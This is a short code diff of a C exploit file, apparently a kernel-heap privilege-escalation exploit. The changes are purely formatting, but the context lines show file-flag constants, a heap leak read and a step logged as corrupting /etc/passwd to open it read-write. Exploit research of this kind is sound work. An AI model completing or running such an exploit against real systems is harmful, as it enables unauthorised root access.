@@ -1,5 +1,5 @@
-#include <unistd.h>
 #include <stdbool.h>
+#include <unistd.h>
 
 #include "libs/pwn.h"
 
@@ -7,11 +7,11 @@
  * EXPLOIT                     *
  *******************************/
 
-#define FILE_SIZE   0x100
-#define VAL_PATH    0x0008400000000000
-#define VAL_RDONLY  0x000a800d00000000
-#define VAL_RDWR    0x000f800f00000000
-#define VAL_MASK    0x000f000f00000000
+#define FILE_SIZE 0x100
+#define VAL_PATH 0x0008400000000000
+#define VAL_RDONLY 0x000a800d00000000
+#define VAL_RDWR 0x000f800f00000000
+#define VAL_MASK 0x000f000f00000000
 
 char clear[FILE_SIZE] = {0};
 
@@ -51,7 +51,7 @@ char clear[FILE_SIZE] = {0};
  * 0000000000000000  | 0000000000000000
  */
 
-int main(int argc, char* argv[]) {
+int main(int argc, char *argv[]) {
   void *ptr;
   bool found;
   int fd;
@@ -77,7 +77,7 @@ int main(int argc, char* argv[]) {
   keap_read(ptr, leak, FILE_SIZE);
 
 #ifdef DEBUG
-  print_hex((char*) leak, FILE_SIZE);
+  print_hex((char *)leak, FILE_SIZE);
 #endif
 
   linfo("corrupt /etc/passwd to make O_RDWR");
